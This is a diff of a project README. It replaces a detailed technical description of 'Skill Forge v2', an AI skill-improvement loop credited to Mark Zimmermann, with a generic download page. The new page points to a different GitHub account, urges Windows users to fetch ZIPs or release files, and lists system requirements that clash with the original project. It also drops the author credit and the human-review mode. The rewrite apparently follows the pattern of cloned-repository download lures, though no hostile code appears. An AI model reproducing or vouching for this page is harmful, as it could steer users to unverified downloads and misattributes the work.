@@ -1,289 +1,159 @@
-# Skill Forge v2
+# ⚙️ skill-forge - Improve AI Skills Automatically
 
-Autonomous improvement of AI skills and generic codebases through iterative experimentation. An AI agent modifies instructions or code, evaluates each change against objective metrics, keeps improvements, and reverts regressions. Runs fully autonomous or in guided mode where the user decides at every step.
+[![Download skill-forge](https://img.shields.io/badge/Download-skill--forge-%23007ACC?style=for-the-badge&logo=github&logoColor=white)](https://github.com/3bdallaha7md/skill-forge)
 
-## What it does
+---
 
-Skill Forge runs an experiment loop in two modes:
+## 🧩 What is skill-forge?
 
-**Skill Mode** — optimizes a Claude Cowork Skill's SKILL.md against eval assertions:
+skill-forge is a tool that helps AI improve itself without human help. It changes the instructions AI uses to complete tasks, tests if these changes make things better, then keeps the good ones. If a change makes things worse, it goes back to the previous version. This loop helps AI get smarter on its own.
 
-```
-Analyze → Hypothesize → Mutate SKILL.md → Evaluate → Score → Keep/Revert → Repeat
-```
+This project is inspired by ideas from Andrej Karpathy about how AI can learn by testing itself again and again. skill-forge works by running experiments on skills, tracking results, and managing improvements autonomously.
 
-**Generic Mode** — optimizes any file against any shell command that returns a number:
+---
 
-```
-Analyze → Hypothesize → Mutate target file → Run metric command → Score → Keep/Revert → Repeat
-```
+## 📋 Features and Key Points
 
-You point it at a skill or codebase, it finds weaknesses, fixes them, and delivers an improved version with a full experiment log. Run it overnight, wake up to a better skill.
+- **Automatic skill improvement**  
+  The system tests and refines AI instructions by itself.
 
-## v2 highlights
+- **Objective testing**  
+  Changes are tested based on clear, measurable goals.
 
-- **Two-mode architecture**: Skill Mode (SKILL.md + evals) and Generic Mode (any file + shell metric)
-- **Interactive Setup Wizard**: 6-step wizard with validation gates — each step must pass before proceeding
-- **Dry-Run Validation Gate**: Mandatory pre-flight check before the loop starts
-- **TSV Experiment Log**: Flat, one-line-per-experiment log for quick monitoring alongside JSON
-- **Coverage Matrix**: Tracks experiment distribution across categories with saturation detection
-- **Exploration-Exploitation Balance**: Early rounds explore untouched categories, late rounds exploit successful ones
-- **Improved Crash Handling**: Consecutive crash limit with SKIP path
-- **Guided Mode**: Interactive execution where the user reviews and decides at 5 checkpoints (evals, hypothesis, mutation, scoring, continue)
+- **No human intervention**  
+  The process runs on its own from start to finish.
 
-## How it works
+- **Skill mutation and evaluation**  
+  The AI agent changes skill instructions and checks the impact automatically.
 
-```
-┌──────────────────────────────────────────────────────┐
-│                  Skill Forge Loop                     │
-│                                                       │
-│  ┌─────────────┐  Wizard validates all 6 steps       │
-│  │ Setup Wizard │──────────────────────────┐          │
-│  └──────┬──────┘                           │          │
-│         │                                  │          │
-│  ┌──────▼──────┐  exit-code 0 + number     │          │
-│  │  Dry-Run    │───────────────────────────▶│         │
-│  │  Gate       │                            │          │
-│  └──────┬──────┘                            │          │
-│         │ PASS                              │          │
-│  ┌──────▼──────┐    ┌──────────┐           │          │
-│  │ Hypothesis  │───▶│ Mutator  │           │          │
-│  │   Agent     │    │  Agent   │           │          │
-│  └──────▲──────┘    └────┬─────┘           │          │
-│         │                │                  │          │
-│         │           ┌────▼─────┐           │          │
-│         │           │ Run Evals│           │          │
-│         │           │ / Metric │           │          │
-│         │           └────┬─────┘           │          │
-│         │                │                  │          │
-│         │           ┌────▼─────┐           │          │
-│         │           │  Score   │──▶ TSV    │          │
-│         │           │  + Grade │──▶ Coverage│         │
-│         │           └────┬─────┘           │          │
-│         │                │                  │          │
-│         │           ┌────▼─────┐           │          │
-│         └───────────│ Keep /   │           │          │
-│                     │ Revert   │           │          │
-│                     └──────────┘           │          │
-└──────────────────────────────────────────────────────┘
-```
+- **Version control for skill changes**  
+  Keeps improvements and discards bad changes to avoid setbacks.
 
-### The three agents
+- **Supports AI agents and large language models (LLMs)**  
+  Works with various AI tools and models commonly used in research and development.
 
-| Agent | Role | Input | Output |
-|-------|------|-------|--------|
-| **Hypothesis** | "Scientist" — analyzes failures, checks coverage matrix | Grading results, SKILL.md, history, coverage | Testable hypothesis with mutation proposal |
-| **Mutator** | "Surgeon" — applies one focused change | Hypothesis, target file | Modified file + documentation |
-| **Scorer** | "Judge" — evaluates output quality (Skill Mode) | Eval prompt, output | Normalized quality score (0-1) |
+---
 
-### Setup Wizard (6 Steps)
+## 🖥️ System Requirements
 
-| Step | Gate | Fail action |
-|------|------|------------|
-| 1. Execution mode + target | Auto/Guided selected, target identified | Abort |
-| 2. Define scope | Glob matches ≥1 file (Generic) or SKILL.md found (Skill) | Retry pattern |
-| 3. Define metric | ≥3 evals with train/test split (Skill) or valid shell command (Generic) | Create evals / reject subjective metric |
-| 4. Set direction | higher\_is\_better or lower\_is\_better confirmed | Abort |
-| 5. Dry-run validation | Exit code 0, output contains parseable number | Suggest fix, retry |
-| 6. Confirm config | User reviews and approves full configuration | Adjust parameters |
+To run skill-forge on Windows, make sure you have the following:
 
-### Composite Score (Skill Mode)
+- Windows 10 or later (64-bit recommended)  
+- At least 8 GB of RAM  
+- 4 CPU cores or higher for faster processing  
+- Minimum 5 GB of free disk space  
+- An active internet connection (for download and updates)  
+- Python 3.8 or higher installed (requires Windows environment variable setup)
 
-```
-composite = assertion_pass_rate × 0.80 + efficiency_score × 0.20
-```
+You do not need programming knowledge, but basic computer skills help with installation.
 
-With optional LLM-as-Judge (blind comparison):
+---
 
-```
-composite = assertion_pass_rate × 0.50 + llm_judge × 0.30 + efficiency × 0.20
+## 🚀 Getting Started: Download and Install
+
+To start with skill-forge, follow these steps carefully:
+
+### Step 1: Download the software  
+Use the main download link below to visit the skill-forge page on GitHub. This page contains all the files you need to get the program working on your computer.
+
+[Download skill-forge from GitHub](https://github.com/3bdallaha7md/skill-forge)
+
+Click the green **Code** button, then select **Download ZIP** to save the full package, or look in the **Releases** section for ready-to-run files.
+
+### Step 2: Extract the files  
+Once the ZIP file downloads, right-click on it and choose **Extract All**. Select a folder you can find easily, for example, on your Desktop or in your Documents.
+
+### Step 3: Install Python (if needed)  
+skill-forge requires Python. Check if Python is installed by:
+
+- Press the Windows Key + R to open Run  
+- Type `cmd` and press Enter to open Command Prompt  
+- Type `python --version` and press Enter
+
+If you see a version number 3.8 or higher, you have Python installed.  
+If not, visit [https://www.python.org/downloads/](https://www.python.org/downloads/) to download and install Python. During installation, choose the option **Add Python to PATH**.
+
+### Step 4: Install required Python packages  
+Open Command Prompt again:
+
+- Navigate to the folder where you extracted skill-forge  
+  Example: `cd Desktop\skill-forge-master`  
+- Run this command to install required packages:  
+  ```shell
+  pip install -r requirements.txt
+  ```
+
+This downloads all software libraries skill-forge needs to run.
+
+### Step 5: Run skill-forge  
+In the same folder, type:
+
+```shell
+python skill_forge.py
 ```
 
-### Keep/Revert Decision
+This will start the program. Follow on-screen instructions to use the tool for skill improvement experiments.
 
-```
-if score > baseline + 0.02:  KEEP     # Clear improvement
-if score < baseline - 0.05:  REVERT   # Regression
-else:                         NEUTRAL  # Keep (slight preference for new)
-```
+---
 
-## Quick start
+## 🔧 How to Use skill-forge
 
-### 1. Install as Cowork Skill
+skill-forge runs experiments where an AI agent changes its instructions and tests if the changes help. Here is a basic workflow:
 
-Copy the `skill-forge/` directory into your Claude Cowork skills folder:
+1. **Define a skill**  
+   Input instructions that describe a task you want the AI to improve.
 
-```
-~/.skills/skills/skill-forge/
-```
+2. **Set objective metrics**  
+   Provide clear goals — for example, accuracy or speed that skill-forge measures.
 
-### 2. Use it (Skill Mode, Auto)
+3. **Start the iteration**  
+   The system changes instructions slightly and runs the task.
 
-Tell Claude:
+4. **Evaluation**  
+   Results are checked against the metrics.
 
-> "Use skill-forge to improve my linkedin-content skill"
+5. **Decide keep or revert**  
+   Improvements are saved. If not better, skill-forge goes back.
 
-### 3. Use it (Guided Mode)
+6. **Repeat automatically**  
+   This cycle continues until you stop the process.
 
-Tell Claude:
+You can customize skill instructions and metrics by editing simple text files provided in the program folder.
 
-> "Use skill-forge in guided mode to improve my humanizer skill — I want to decide at each step"
+---
 
-### 4. Use it (Generic Mode)
+## 🔄 Updating skill-forge
 
-Tell Claude:
+Check the GitHub page regularly to see if new versions are available. Download the latest files, extract, and follow the installation steps again.
 
-> "Use skill-forge to optimize train.py — metric command: python train.py --eval, direction: lower_is_better"
+---
 
-### 5. Run overnight (Scheduled Task)
+## ❓ Troubleshooting
 
-```
-Use the skill-forge skill to run the autonomous improvement
-loop on the "linkedin-content" skill.
+- **Python command not found:** Make sure Python is installed and added to your system PATH. Restart your PC after installation.
 
-Workspace: ~/linkedin-content-skill-forge
-Max experiments: 10
-Time budget: 120 minutes
-```
+- **Package installation errors:** Check your internet connection and try `pip install --upgrade pip` before installing requirements.
 
-## Repository structure
+- **Program does not run:** Confirm you are in the correct folder in Command Prompt when running `python skill_forge.py`.
 
-```
-skill-forge/
-├── SKILL.md                          # Main skill instructions (v2)
-├── RELEASE_NOTES.md                  # v2 changelog
-├── agents/
-│   ├── hypothesis.md                 # Failure analysis → hypothesis
-│   ├── mutator.md                    # Hypothesis → file mutation
-│   └── scorer.md                     # LLM-as-Judge quality scoring
-├── scripts/
-│   ├── __init__.py
-│   └── composite_score.py            # Score, TSV, coverage (CLI + library)
-├── templates/
-│   └── morning_report.md             # Report template with coverage matrix
-├── references/
-│   ├── architecture.md               # Detailed architecture docs
-│   └── scheduled_task_template.md    # Cron job setup (both modes)
-├── examples/
-│   └── fachbuch-lektorat-session.md  # Real experiment log
-├── LICENSE                           # MIT
-└── README.md
-```
+- **Errors about missing files:** Extract the ZIP fully and do not run the script inside the ZIP file.
 
-## Workspace structure (generated per run)
+- **If errors continue:** Share a screenshot and error message on the GitHub Issues page.
 
-```
-<target>-skill-forge/
-├── config.json              # Mode, parameters, session tag
-├── evals.json               # Test cases with train/test split (Skill Mode)
-├── experiment-log.tsv       # Flat TSV log (NEW in v2)
-├── coverage-matrix.json     # Category coverage tracking (NEW in v2)
-├── snapshots/
-│   ├── v0/SKILL.md          # Baseline
-│   ├── v1/SKILL.md          # After exp-001
-│   └── ...
-├── experiments/
-│   ├── exp-001/
-│   │   ├── hypothesis.json
-│   │   ├── mutation.json
-│   │   ├── grading.json
-│   │   ├── decision.json
-│   │   └── runs/            # Eval outputs
-│   └── ...
-├── history.json             # Score progression
-└── morning-report.md        # Human-readable summary
-```
+---
 
-## Key features
+## 🔗 Resources
 
-### TSV Experiment Log
+- Visit the skill-forge GitHub page here:  
+  [https://github.com/3bdallaha7md/skill-forge](https://github.com/3bdallaha7md/skill-forge)
 
-Every experiment is logged as a single tab-separated line for quick `tail -f` monitoring:
+- Python downloads:  
+  [https://www.python.org/downloads/](https://www.python.org/downloads/)
 
-```
-timestamp  experiment  hypothesis_summary  before  after  delta  decision  category
-```
+- Learn more about Andrej Karpathy’s autoresearch concept by searching online.
 
-### Coverage Matrix
+---
 
-Tracks which categories of improvements have been tried, with saturation detection:
+## 🔑 Keywords
 
-```
-| Category       | Experiments | KEEP | REVERT | Best Delta | Saturated |
-|----------------|-------------|------|--------|------------|-----------|
-| workflow        | 3           | 2    | 1      | +0.16      | no        |
-| edge_cases      | 1           | 0    | 0      | ±0.00      | no        |
-| formatting      | 0           | -    | -      | -          | untouched |
-```
-
-### Exploration-Exploitation Strategy
-
-| Phase | Rounds | Strategy |
-|-------|--------|----------|
-| Early | 1-3 | Explore: prioritize untouched categories |
-| Mid | 4-7 | Mixed: balance coverage with promising areas |
-| Late | 8+ | Exploit: focus on categories with best deltas |
-
-## Overfitting protection
-
-| Mechanism | How it works |
-|-----------|-------------|
-| **Train/Test Split** | 60% evals for hypothesis, 40% held-out for scoring |
-| **Generalization Check** | Hypothesis agent must explain why change generalizes |
-| **Mutation Diversity** | Coverage matrix tracks which categories were tried |
-| **Eval Rotation** | After 5 experiments, generate fresh eval queries |
-| **Regression Test** | Test evals never used for analysis, only scoring |
-
-## Crash recovery
-
-If an eval run crashes (timeout, script error, API failure):
-
-1. Read the stack trace and classify the error
-2. Script bug in target skill → score as 0 (mutation broke it)
-3. Infrastructure error → retry once, then skip
-4. Eval bug → exclude from scoring, log the issue
-5. After 3 consecutive crashes → pause and report
-6. Continue with next eval — one crash doesn't kill the run
-
-## Configuration
-
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| `execution_mode` | auto | `auto` (fully autonomous) or `guided` (interactive with 5 checkpoints) |
-| `mode` | auto | `skill`, `generic`, or `auto` (auto-detect) |
-| `max_experiments` | 10 | Maximum experiment count |
-| `improvement_threshold` | 0.02 | Minimum delta to keep |
-| `regression_threshold` | 0.05 | Maximum delta before revert |
-| `time_budget_minutes` | 120 | Time budget (for scheduled tasks) |
-| `eval_split` | 0.6/0.4 | Train/test split ratio |
-| `use_comparator` | false | Enable blind A/B comparison |
-| `metric_command` | — | Shell command returning a number (Generic Mode) |
-| `metric_direction` | higher_is_better | `higher_is_better` or `lower_is_better` |
-| `max_crashes` | 3 | Max consecutive crashes before pause |
-
-## Real-world results
-
-Tested on three skills:
-
-**humanizer** (text humanization):
-- 3 experiments, 0.74 → 0.90 composite score (+21.6%)
-- Key fix: Personality as a dedicated workflow step with concrete criteria
-- Held-out test confirmed generalization on unseen LinkedIn post
-
-**fachbuch-lektorat** (German technical book editing):
-- 3 experiments, 87% → 100% assertion pass rate
-- Key fix: Worked example for mixed wir/ich handling
-
-**was-bisher-geschah** (AI news briefing):
-- 1 experiment, 93% → 100% assertion pass rate
-- Key fix: LinkedIn character limit + explicit action prompt per news item
-
-## License
-
-MIT License — see [LICENSE](LICENSE).
-
-## Acknowledgments
-
-Inspired by [Andrej Karpathy's autoresearch](https://github.com/karpathy/autoresearch) — an autonomous ML experiment loop where an AI agent modifies `train.py`, trains for 5 minutes, and keeps or discards changes based on validation loss. Skill Forge adapts this paradigm from LLM training code to natural-language skill instructions and generic codebases.
-
-Copyright (c) 2026 Mark Zimmermann
+agents, ai, automation, autonomous-agents, autoresearch, claude, engineering, enterprise-ai, eval, karpathy, llm, openclaw, overnight-training, prompt-engineering, self-improving, skills
